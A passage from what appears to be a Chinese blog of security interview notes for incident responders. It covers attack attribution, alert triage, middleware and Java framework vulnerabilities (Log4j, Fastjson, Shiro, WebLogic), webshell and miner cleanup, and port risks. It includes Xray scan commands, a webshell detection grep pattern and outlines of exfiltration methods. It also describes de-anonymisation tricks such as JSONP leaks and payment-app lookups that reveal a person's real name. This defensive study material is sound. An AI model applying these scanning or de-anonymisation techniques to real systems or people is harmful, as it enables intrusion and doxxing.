提取样本特征、用户名、ID、邮箱、C2 服务器等信息–同源分析</span><br><span class=\"line\">    溯源案例：样本分析过程中，发现攻击者的个人 ID 和 QQ，成功定位到攻击者</span><br><span class=\"line\">    社交账号</span><br><span class=\"line\">    基于 JSONP 跨域，获取攻击者的主机信息、浏览器信息、真实 IP 及社交信息等</span><br><span class=\"line\">    利用条件：可以找到相关社交网站的 jsonp 接口泄露敏感信息，相关网站登录未注销</span><br><span class=\"line\">3.攻击者画像</span><br><span class=\"line\">    攻击路径</span><br><span class=\"line\">    攻击目的：拿到权限、窃取数据、获取利益、DDOS 等</span><br><span class=\"line\">    网络代理：代理 IP、跳板机、C2 服务器等</span><br><span class=\"line\">    攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等</span><br><span class=\"line\"></span><br><span class=\"line\">    攻击者身份画像</span><br><span class=\"line\">    虚拟身份：ID、昵称、网名</span><br><span class=\"line\">    真实身份：姓名、物理位置</span><br><span class=\"line\">    联系方式：手机号、qq/微信、邮箱</span><br><span class=\"line\">    组织情况：单位名称、职位信息</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"溯源的技巧\"><a href=\"#溯源的技巧\" class=\"headerlink\" title=\"溯源的技巧\"></a>溯源的技巧</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">域名、ip 反查目标个人信息</span><br><span class=\"line\">支付宝转账，确定目标姓氏</span><br><span class=\"line\">淘宝找回密码，确定目标名字</span><br><span class=\"line\">企业微信手机号查公司名称</span><br><span class=\"line\">REG007 查注册应用、网站</span><br><span class=\"line\">程序 PDB 信息泄露</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"设备常见的误报\"><a href=\"#设备常见的误报\" class=\"headerlink\" title=\"设备常见的误报\"></a>设备常见的误报</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 如果看到一个告警IP，如何判断其是否是真实的攻击？</span><br><span class=\"line\">\t首先看下告警中攻击者的IP是内网IP还是外网IP。如果是内网IP，首先根据请求包和响应包进行判断。比如看下请求包内是否有SQL语句，如果有SQL语句，并且响应包内容有执行成功的回显（就是响应包内有），那么判断确实是SQL攻击，需要上报给研判人员，让研判人员跟在场的负责人员确认下攻击的业务系统是否是业务系统本身存在这种漏洞，是否是本身的业务逻辑造成的。如果是因为本身业务逻辑造成的并且攻击者IP确认为安全的IP，那么本次攻击应当是误判，如果IP为不安全的IP（IP所有者在此期间内没有进行操作），那么可能是真实攻击行为。</span><br><span class=\"line\">\t外网攻击者IP判断是否是攻击的话，就根据请求包和响应包内容进行对比，看一下是否是恶意动作，如果是恶意动作，那么判断为真实攻击。</span><br><span class=\"line\">\t</span><br><span class=\"line\">2. 如果看到一条SQL注入告警，怎么判断是否攻击成功？</span><br><span class=\"line\">\t根据请求包和响应包对比进行判断，比如看下请求包是否有SQL语句，如果有SQL语句（例如select version），并且响应包内容有执行成功的回显，那么判断确实是SQL攻击，并且成功了。</span><br><span class=\"line\">\t</span><br><span class=\"line\">3. 如果看到一条文件上传的告警，怎么判断是否攻击成功？</span><br><span class=\"line\">\t根据请求包和响应包对比进行判断，看一下请求包文件名是否是恶意的脚本文件名称，请求包内容是否含有恶意脚本内容，然后看一下响应包状态码是否是200或302，如果符合上述两个特征，那么可能上传成功，上报给研判人员，让研判人员进行验证。</span><br><span class=\"line\">\t</span><br><span class=\"line\">4. 如果看到一条命令执行的告警，怎么判断是否攻击成功？</span><br><span class=\"line\">\t根据请求包和响应包对比进行判断，看一下请求包内是否有系统命令，比如看一下请求包内是否有ipconfig，然后看下响应包回显是否有IP内容，如果确实有说明攻击成功，如果没有，说明大概率攻击未成功，但是存在恶意攻击，将此告警上报给研判人员，研判人员进行二次验证。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"常见漏洞扫描工具\"><a href=\"#常见漏洞扫描工具\" class=\"headerlink\" title=\"常见漏洞扫描工具\"></a>常见漏洞扫描工具</h3><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. AWVS</span><br><span class=\"line\">2. APPscan</span><br><span class=\"line\">3. OpenVAS</span><br><span class=\"line\">4. Xray</span><br><span class=\"line\">    4.1. 基于代理的被动扫描：./xray webscan --listen 127.0.0.1:7777</span><br><span class=\"line\">    4.2. ./xray webscan --basic-crawler 目标网站</span><br><span class=\"line\">    4.3. ./xray webscan --plugins cmd_injection --url 目标网站</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"中间件和框架漏洞\"><a href=\"#中间件和框架漏洞\" class=\"headerlink\" title=\"中间件和框架漏洞\"></a>中间件和框架漏洞</h3><h4 id=\"常见中间件漏洞\"><a href=\"#常见中间件漏洞\" class=\"headerlink\" title=\"常见中间件漏洞\"></a>常见中间件漏洞</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">IIS:</span><br><span class=\"line\">    1. PUT漏洞：IIS server在web服务拓展中开启了webdav，配置写入权限，脚本资源访问权限，导致任意文件上传</span><br><span class=\"line\">    2. 短文件名拆解漏洞：IIS短文件名机制，可以暴力拆解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造某个不存在的短文件名，返回400</span><br><span class=\"line\">    3. 远程代码执行</span><br><span class=\"line\">    4. 解析漏洞：test.asp/1.jpg会被当做asp文件来执行</span><br><span class=\"line\">    </span><br><span class=\"line\">Apache：</span><br><span class=\"line\">    1. 解析漏洞：Apache默认一个文件可以有多个以点分割的后缀，比如test.php.xxx，当最右边的后缀无法识别的时候，则会向左识别，直到识别到合法的后缀才能进行解析</span><br><span class=\"line\">    2. 目录遍历：程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件</span><br><span class=\"line\">    </span><br><span class=\"line\">Nginx：</span><br><span class=\"line\">    1. 目录遍历：程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件</span><br><span class=\"line\">    2. CRLF注入：由于Nginx没有正确地处理HTTP请求中的换行符和回车符导致的。攻击者可以在HTTP请求中注入特殊的CRLF字符序列，从而执行任意的命令或者篡改HTTP响应</span><br><span class=\"line\">    3. 目录穿越：NGINX在配置别名的时候，如果忘记加/，将造成目录穿越漏洞</span><br><span class=\"line\"></span><br><span class=\"line\">Tomcat：</span><br><span class=\"line\">    1. 远程代码执行：当tomcat启用了HTTP的put方法，攻击者就可能通过精心构造的攻击请求数据包向服务器上传包含任意代码的jsp文件，jsp文件中的恶意代码将能被服务器执行。</span><br><span class=\"line\">    2. war后门文件部署：tomcat支持后台文件部署war后门，可以直接将webshell部署到web目录下</span><br><span class=\"line\"></span><br><span class=\"line\">jboss：</span><br><span class=\"line\">    1. 反序列化漏洞</span><br><span class=\"line\">    2. war后门文件部署</span><br><span class=\"line\">    </span><br><span class=\"line\">weblogic：</span><br><span class=\"line\">    1. Java反序列化：该漏洞通过t3协议（Oracle WebLogic Server中使用的自定义协议，是基于Java对象序列化和反序列化机制，通过网络传输Java对象）触发，可导致未授权的用户在远程服务器执行任意命令</span><br><span class=\"line\">    2. weblogic未授权RCE：允许后台任意用户通过HTTP协议执行任意命令</span><br><span class=\"line\">    3. weblogic任意文件上传：weblogic web service test page中存在任意文件上传，攻击者可以通过任意jsp文件来getshell</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"常见框架漏洞\"><a href=\"#常见框架漏洞\" class=\"headerlink\" title=\"常见框架漏洞\"></a>常见框架漏洞</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">Struts2：</span><br><span class=\"line\">\t1. Struts2代码执行：【允许攻击者通过构造恶意OGNL表达式来执行任意代码】Struts2框架中的Action类允许开发人员使用OGNL表达式处理用户请求，攻击者利用应用程序未正确验证或过滤用户输入的缺陷，构造恶意输入，然后应用程序会将输入作为OGNL表达式进行解析和执行，就可能导致恶意代码的执行。（任意代码执行、系统命令执行、文件读取、数据库操作）</span><br><span class=\"line\">\t2. Struts2 OGNL注入漏洞：当应用程序未正确验证或过滤用户输入时，攻击者可以通过构造恶意的OGNL表达式注入恶意代码</span><br><span class=\"line\">\t3. XML解析漏洞：当Struts2应用程序使用XML解析功能时，存在潜在的XXE漏洞。</span><br><span class=\"line\">\t4. 文件上传漏洞：如果应用程序未正确验证和处理用户上传的文件，攻击者可以上传恶意文件，并执行任意代码或篡改系统文件</span><br><span class=\"line\"></span><br><span class=\"line\">thinkphp：</span><br><span class=\"line\">\t1. SQL注入：当应用程序未正确过滤和转义用户输入时，攻击者可以通过构造恶意的SQL查询语句来执行未经授权的数据库操作</span><br><span class=\"line\">\t2. 反序列化漏洞：如果应用程序在反序列化用户提供的数据时存在漏洞，攻击者可以构造恶意序列化数据，导致执行任意代码</span><br><span class=\"line\">\t3. 远程命令执行漏洞：当应用程序在执行系统命令时未正确验证或过滤用户输入，攻击者可以通过构造恶意的命令注入漏洞执行任意系统命令</span><br><span class=\"line\"></span><br><span class=\"line\">spring：</span><br><span class=\"line\">\t1. Spring远程命令执行：当应用程序在处理用户输入时，未正确验证或过滤数据，攻击者可以构造恶意的输入来执行任意代码</span><br><span class=\"line\">\t2. 未授权访问：如果应用程序在访问受限资源时存在授权验证缺陷，攻击者可以绕过身份验证和访问控制，获取未经授权的访问权限</span><br><span class=\"line\">\t3. 反序列化漏洞：如果应用程序在反序列化用户提供的数据时存在漏洞，攻击者可以构造恶意序列化数据，导致执行任意代码</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"log4j\"><a href=\"#log4j\" class=\"headerlink\" title=\"log4j\"></a>log4j</h4><h5 id=\"原理-10\"><a href=\"#原理-10\" class=\"headerlink\" title=\"原理\"></a>原理</h5><ul>\n<li>log4j漏洞原理：这是一个基于Java的日志记录工具，由于log4j2某些功能存在递归解析功能，攻击者可以直接构造恶意请求，触发远程代码执行。</li>\n<li>log4j 2漏洞原理：log4j 2是Java语言的日志处理套件，使用极其广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过lookup进行JNDI注入，执行任意代码。</li>\n</ul>\n<h5 id=\"log4j远程代码执行漏洞\"><a href=\"#log4j远程代码执行漏洞\" class=\"headerlink\" title=\"log4j远程代码执行漏洞\"></a>log4j远程代码执行漏洞</h5><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">原理：</span><br><span class=\"line\">Log4j 是Apache 的一个开源项目，是一款基于Java 的开源日志记录工具。该漏洞主要是由于日志在打印时当遇到$&#123;后，以:号作为分割，将表达式内容分割成两部分，前面一部分prefix，后面部分作为key，然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行，引发远程代码执行漏洞。</span><br><span class=\"line\"></span><br><span class=\"line\">具体操作：</span><br><span class=\"line\">在正常的log处理过程中对$&#123;这两个紧邻的字符做了检测，一旦匹配到类似于表达式结构的字符串就会触发替换机制，将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"fastjson\"><a href=\"#fastjson\" class=\"headerlink\" title=\"fastjson\"></a>fastjson</h4><h5 id=\"fastjson反序列化漏洞\"><a href=\"#fastjson反序列化漏洞\" class=\"headerlink\" title=\"fastjson反序列化漏洞\"></a>fastjson反序列化漏洞</h5><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">判断：</span><br><span class=\"line\">正常请求是get请求并且没有请求体，可以通过构造错误的POST请求，即可查看在返回包中是否有fastjson这个字符串来判断。</span><br><span class=\"line\"></span><br><span class=\"line\">原理：</span><br><span class=\"line\">fastjson是阿里巴巴开发的一款将json字符串和java对象进行序列化和反序列化的开源json解析库。fastjson提供了autotype功能，在请求过程中，我们可以在请求包中通过修改@type的值，来反序列化为指定的类型，而fastjson在反序列化过程中会设置和获取类中的属性，如果类中存在恶意方法，就会导致代码执行等这类问题。</span><br><span class=\"line\"></span><br><span class=\"line\">无回显怎么办：</span><br><span class=\"line\">1.一种是直接将命令执行结果写入到静态资源文件里，如html、js等，然后通过http访问就可以直接看到结果</span><br><span class=\"line\">2.通过dnslog进行数据外带，但如果无法执行dns请求就无法验证了</span><br><span class=\"line\">3.直接将命令执行结果回显到请求Poc的HTTP响应中</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"fastjson不出网利用链\"><a href=\"#fastjson不出网利用链\" class=\"headerlink\" title=\"fastjson不出网利用链\"></a>fastjson不出网利用链</h5><ul>\n<li>TemplatesImpl利用链：<ul>\n<li>这个利用链有限制，由于该字段在fastjson1.2.22版本引入，所以只能影响1.2.22~1.2.24</li>\n<li>使用条件：<ul>\n<li>parseObject(input,Object.class,Feature.SupportNonPublicField)</li>\n<li>parse(input,Feature.SupportNonPublicField)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>BCEL字节码利用</li>\n</ul>\n<h4 id=\"shiro\"><a href=\"#shiro\" class=\"headerlink\" title=\"shiro\"></a>shiro</h4><h5 id=\"shiro反序列化漏洞\"><a href=\"#shiro反序列化漏洞\" class=\"headerlink\" title=\"shiro反序列化漏洞\"></a>shiro反序列化漏洞</h5><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">原理：</span><br><span class=\"line\">Shiro是Apache下的一个开源Java安全框架，执行身份认证，授权，密码和会话管理。shiro在用户登录时除了账号密码外还提供了可传递选项remember me。用户在登录时如果勾选了remember me选项，那么在下一次登录时浏览器会携带cookie中的remember me字段发起请求，就不需要重新输入用户名和密码。</span><br><span class=\"line\"></span><br><span class=\"line\">判断：</span><br><span class=\"line\">1.数据返回包中包含rememberMe=deleteMe字段。</span><br><span class=\"line\">2.直接发送原数据包，返回的数据中不存在关键字可以通过在发送数据包的cookie中增加字段：****rememberMe=然后查看返回数据包中是否存在关键字。</span><br><span class=\"line\"></span><br><span class=\"line\">shiro-550：</span><br><span class=\"line\">shiro反序列化漏洞利用有两个关键点，首先是在shiro&lt;1.2.4时，AES加密的密钥Key被硬编码在代码里，只要能获取到这个key就可以构造恶意数据让shiro识别为正常数据。另外就是shiro在验证rememberMe时使用了readObject方法，readObject用来执行反序列化后需要执行的代码片段，从而造成恶意命令可以被执行。攻击者构造恶意代码，并且序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行编码，解密并且反序列化，最终造成反序列化漏洞。</span><br><span class=\"line\"></span><br><span class=\"line\">shiro-721：</span><br><span class=\"line\">不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的Remember。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"weblogic\"><a href=\"#weblogic\" class=\"headerlink\" title=\"weblogic\"></a>weblogic</h4><p>端口：7001</p>\n<h5 id=\"weblogic反序列化\"><a href=\"#weblogic反序列化\" class=\"headerlink\" title=\"weblogic反序列化\"></a>weblogic反序列化</h5><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">XMLDecoder反序列化：weblogic的WLS security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</span><br><span class=\"line\"></span><br><span class=\"line\">weblogic T3协议反序列化命令执行：远程攻击者通过T3协议在weblogic server中执行反序列化操作，利用RMI（远程方法调用）机制的缺陷，通过JRMP（Java远程方法协议）达到任意反序列化代码，进而造成远程代码执行。</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"常见安全设备\"><a href=\"#常见安全设备\" class=\"headerlink\" title=\"常见安全设备\"></a>常见安全设备</h3><h4 id=\"入侵检测系统IPS\"><a href=\"#入侵检测系统IPS\" class=\"headerlink\" title=\"入侵检测系统IPS\"></a>入侵检测系统IPS</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">是计算机网络安全设施，是对防病毒软件和防火墙的补充。入侵预防系统是一部能够监视网络或网络设备的网络数据传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络数据传输行为。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"入侵防御系统IDS\"><a href=\"#入侵防御系统IDS\" class=\"headerlink\" title=\"入侵防御系统IDS\"></a>入侵防御系统IDS</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">积极主动的防护措施，按照一定的安全策略，通过软件，硬件对网络，系统的运行进行实时的监控，尽可能地发现网络攻击行为，积极主动的处理攻击，保证网络资源的机密性，完整性和可用性。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"防火墙\"><a href=\"#防火墙\" class=\"headerlink\" title=\"防火墙\"></a>防火墙</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">防火墙是位于两个(或多个)网络间，实行网络间访问或控制的一组组件集合之硬件或软件。隔离网络，制定出不同区域之间的访问控制策略来控制不同信任程度区域间传送的数据流。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"堡垒机\"><a href=\"#堡垒机\" class=\"headerlink\" title=\"堡垒机\"></a>堡垒机</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">是针对内部运维人员的运维安全审计系统。主要功能是对运维人员的运维操作进行审计和权限控制(比如要登录某些平台或者系统只能通过堡垒机才可以，不用堡垒机是无法访问的)。同时堡垒机还有账号集中管理，单点登录(在堡垒机上登录即可实现对多个其他平台的无密登录)等功能。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"态势感知平台\"><a href=\"#态势感知平台\" class=\"headerlink\" title=\"态势感知平台\"></a>态势感知平台</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">以大数据平台为基础，通过收集多元，异构的海量日志，利用关联分析，机器学习，威胁情报，可视化等技术，帮助用户持续监测网络安全态势，实现从被动防御向积极防御的进阶。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"终端安全管理系统\"><a href=\"#终端安全管理系统\" class=\"headerlink\" title=\"终端安全管理系统\"></a>终端安全管理系统</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">是集防病毒，终端安全管控，终端准入，终端审计，外设管控，EDR等功能于一体，兼容不同操作系统和计算机平台，帮助客户实现平台一体化，功能一体化，数据一体化的终端安全立体防护。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"WAF\"><a href=\"#WAF\" class=\"headerlink\" title=\"WAF\"></a>WAF</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">WAF是以网站或应用系统为核心的安全产品，通过对HTTP或HTTPS的Web攻击行为进行分析并拦截，有效的降低网站安全风险。产品主要部署在网站服务器的前方。通过特征提取和分块检索技术进行模式匹配来达到过滤，分析，校验网络请求包的目的，在保证正常网络应用功能的同时，隔绝或者阻断无效或者非法的攻击请求。</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"WAF的分类\"><a href=\"#WAF的分类\" class=\"headerlink\" title=\"WAF的分类\"></a>WAF的分类</h5><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">WAF分为非嵌入型WAF和嵌入型WAF，非嵌入型指的是硬WAF、云WAF、虚拟机WAF之类的；嵌入型指的是web容器模块类型WAF、代码层WAF。</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"WAF的原理\"><a href=\"#WAF的原理\" class=\"headerlink\" title=\"WAF的原理\"></a>WAF的原理</h5><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">Web应用防火墙是通过执行一系列针对HTTP或者HTTPS的安全策略来专门为Web应用提供保护的一款产品。WAF对请求的内容进行规则匹配、行为分析等识别出恶意行为，并执行相关动作，这些动作包括阻断、记录、告警等。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"蜜罐\"><a href=\"#蜜罐\" class=\"headerlink\" title=\"蜜罐\"></a>蜜罐</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">蜜罐是一种安全威胁的主动防御技术，它通过模拟一个或多个易受攻击的主机或服务来吸引攻击者，捕获攻击流量与样本，发现网络威胁，提取威胁特征，蜜罐的价值在于被探测，攻陷。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"其他-1\"><a href=\"#其他-1\" class=\"headerlink\" title=\"其他\"></a>其他</h3><h4 id=\"如何判断攻击是通过什么漏洞攻击的\"><a href=\"#如何判断攻击是通过什么漏洞攻击的\" class=\"headerlink\" title=\"如何判断攻击是通过什么漏洞攻击的\"></a>如何判断攻击是通过什么漏洞攻击的</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 审查日志：仔细检查服务器的日志文件，包括系统日志、web服务器日志、应用程序日志等；特别要关注失败的身份验证尝试、异常URL请求、异常的命令执行等</span><br><span class=\"line\">2. 网络流量分析：分析服务器的网络流量，使用网络流量分析工具检测异常的网络连接、数据包捕获和协议分析，查看来自外部网络的异常流量和不寻常的通信模式</span><br><span class=\"line\">3. 漏洞扫描和渗透测试结果</span><br><span class=\"line\">4. 威胁情报和公开漏洞信息</span><br><span class=\"line\">5. 恶意软件分析</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"挖矿病毒判断\"><a href=\"#挖矿病毒判断\" class=\"headerlink\" title=\"挖矿病毒判断\"></a>挖矿病毒判断</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">挖矿木马占用系统资源进行挖矿行为，一般电脑有以下特征：</span><br><span class=\"line\">    1. 系统响应缓慢</span><br><span class=\"line\">    2. CPU/显卡使用率过高</span><br><span class=\"line\">    3. 内存/带宽占用高</span><br><span class=\"line\">登录可疑主机之后，通过以下方式来确定是否有挖矿木马：</span><br><span class=\"line\">    1. 查看进程：系统命令ps、ls可能被替换</span><br><span class=\"line\">    2. 检查日志、检查系统用户</span><br><span class=\"line\">    3. 检查是否有异常文件</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"清除挖矿木马\"><a href=\"#清除挖矿木马\" class=\"headerlink\" title=\"清除挖矿木马\"></a>清除挖矿木马</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 原因排查</span><br><span class=\"line\">2. 清除木马：</span><br><span class=\"line\">\t（1）及时隔离主机；</span><br><span class=\"line\">\t（2）删除文件、阻断与矿池通讯；</span><br><span class=\"line\">\t（3）清除定时任务；</span><br><span class=\"line\">\t（4）清除自启动项；</span><br><span class=\"line\">\t（5）kill挖矿进程</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"木马驻留系统的方式\"><a href=\"#木马驻留系统的方式\" class=\"headerlink\" title=\"木马驻留系统的方式\"></a>木马驻留系统的方式</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 注册表</span><br><span class=\"line\">2. 服务</span><br><span class=\"line\">3. 启动目录</span><br><span class=\"line\">4. 计划任务</span><br><span class=\"line\">5. 关联文件类型</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"查看异常端口进程情况\"><a href=\"#查看异常端口进程情况\" class=\"headerlink\" title=\"查看异常端口进程情况\"></a>查看异常端口进程情况</h4><p><code>netstat -anltp|grep bash</code></p>\n<h4 id=\"如何查看网站是否存在webshell\"><a href=\"#如何查看网站是否存在webshell\" class=\"headerlink\" title=\"如何查看网站是否存在webshell\"></a>如何查看网站是否存在webshell</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">find 网站根目录/* -type f -name &quot;*.php&quot; |xargs grep &quot;eval|assert|system&quot;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"服务器存在webshell如何处理（网站被上传webshell如何处理）\"><a href=\"#服务器存在webshell如何处理（网站被上传webshell如何处理）\" class=\"headerlink\" title=\"服务器存在webshell如何处理（网站被上传webshell如何处理）\"></a>服务器存在webshell如何处理（网站被上传webshell如何处理）</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 及时隔离主机</span><br><span class=\"line\">2. 定位事件范围：查看webshell创建的时间，对webshell进行取样分析</span><br><span class=\"line\">3. 通过创建时间和日志进行综合分析，以确定系统存在的漏洞</span><br><span class=\"line\">4. 清除webshell以及残余文件，修复漏洞</span><br><span class=\"line\">------------------------------------------------------------</span><br><span class=\"line\">1. 首先关闭网站，下线服务。有必要的话将服务器断网隔离；</span><br><span class=\"line\">2. 手工结合工具进行检测；</span><br><span class=\"line\">\t2.1. 工具可以使用D盾、河马webshell查杀、百度在线webshell查杀等工具对网站目录进行排查查杀</span><br><span class=\"line\">\t2.2. 手工方面对比未上传webshell之前备份的文件，从文件或者代码层面进行对比</span><br><span class=\"line\">3. 加强安全策略，例如：定期备份网站配置文件，及时安装服务器补丁，定时更新安全防护软件，定期修改密码等措施。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"常见端口漏洞\"><a href=\"#常见端口漏洞\" class=\"headerlink\" title=\"常见端口漏洞\"></a>常见端口漏洞</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">数据库类：（扫描弱口令）</span><br><span class=\"line\">    1433：mssql</span><br><span class=\"line\">    1521：oracle</span><br><span class=\"line\">    3306：MySQL</span><br><span class=\"line\">特殊服务：（未授权/命令执行）</span><br><span class=\"line\">    443：SSL心脏滴血</span><br><span class=\"line\">    6379：Redis未授权访问</span><br><span class=\"line\">    7001、7002：weblogic默认弱口令</span><br><span class=\"line\">    27017、27018：MongoDB未授权</span><br><span class=\"line\">常见端口：（弱口令/端口爆破）</span><br><span class=\"line\">    21：FTP弱口令、ms12-073</span><br><span class=\"line\">    25：SMTP简单邮件传输服务器端口</span><br><span class=\"line\">    23：telnet端口，弱口令</span><br><span class=\"line\">    22：ssh，弱口令</span><br><span class=\"line\">    53：dns端口</span><br><span class=\"line\">    445：SMB，ms08-067、ms17-010和IPC$攻击手段</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"给你一个比较大的日志，应该如何分析\"><a href=\"#给你一个比较大的日志，应该如何分析\" class=\"headerlink\" title=\"给你一个比较大的日志，应该如何分析\"></a>给你一个比较大的日志，应该如何分析</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 攻击规则匹配，通过正则匹配日志中的攻击请求</span><br><span class=\"line\">2. 统计方法，统计请求出现的次数，次数少于同类请求平均次数则为异常请求</span><br><span class=\"line\">3. 白名单模式，为正常请求建立白名单，不在名单范围内的则为异常请求</span><br><span class=\"line\">4. 借助日志分析工具</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Windows和Linux的日志存放位置\"><a href=\"#Windows和Linux的日志存放位置\" class=\"headerlink\" title=\"Windows和Linux的日志存放位置\"></a>Windows和Linux的日志存放位置</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">Windows：</span><br><span class=\"line\">    系统日志：%systemroot%\\system32\\winevt\\logs\\system.evtx</span><br><span class=\"line\">    应用程序日志：%systemroot%\\system32\\winevt\\logs\\application.evtx</span><br><span class=\"line\">    安全日志：%systemroot%\\system32\\winevt\\logs\\security.evtx</span><br><span class=\"line\">Linux：</span><br><span class=\"line\">    日志默认存放位置：/var/log</span><br><span class=\"line\">    查看日志配置情况：more /etc/rsyslog.conf</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"常见中间件的配置文件路径\"><a href=\"#常见中间件的配置文件路径\" class=\"headerlink\" title=\"常见中间件的配置文件路径\"></a>常见中间件的配置文件路径</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">Apache：/etc/httpd/conf</span><br><span class=\"line\">Nginx：/etc/nginx</span><br><span class=\"line\">iis7：C:\\windows\\system32\\inetsrv\\config\\</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"常见的waf\"><a href=\"#常见的waf\" class=\"headerlink\" title=\"常见的waf\"></a>常见的waf</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 云waf</span><br><span class=\"line\">2. web防护软件</span><br><span class=\"line\">3. 硬件web防火墙</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"waf有哪些防护方式\"><a href=\"#waf有哪些防护方式\" class=\"headerlink\" title=\"waf有哪些防护方式\"></a>waf有哪些防护方式</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. web基础防护</span><br><span class=\"line\">2. CC攻击防护</span><br><span class=\"line\">3. IP黑白名单</span><br><span class=\"line\">4. 地理位置访问控制</span><br><span class=\"line\">5. 网页防篡改</span><br><span class=\"line\">6. 防敏感信息泄露</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Java中常见的关键字\"><a href=\"#Java中常见的关键字\" class=\"headerlink\" title=\"Java中常见的关键字\"></a>Java中常见的关键字</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. SPI：服务供应接口</span><br><span class=\"line\">2. RMI：Java远程方法调用</span><br><span class=\"line\">3. LDAP：轻量级目录访问协议</span><br><span class=\"line\">4. CORBA：通用对象请求代理架构</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Java中常见框架漏洞使用的协议\"><a href=\"#Java中常见框架漏洞使用的协议\" class=\"headerlink\" title=\"Java中常见框架漏洞使用的协议\"></a>Java中常见框架漏洞使用的协议</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">weblogic反序列化：T3协议和XMLDecodeer</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"常见的OA系统\"><a href=\"#常见的OA系统\" class=\"headerlink\" title=\"常见的OA系统\"></a>常见的OA系统</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">PHP：通达OA、泛微Eoffice</span><br><span 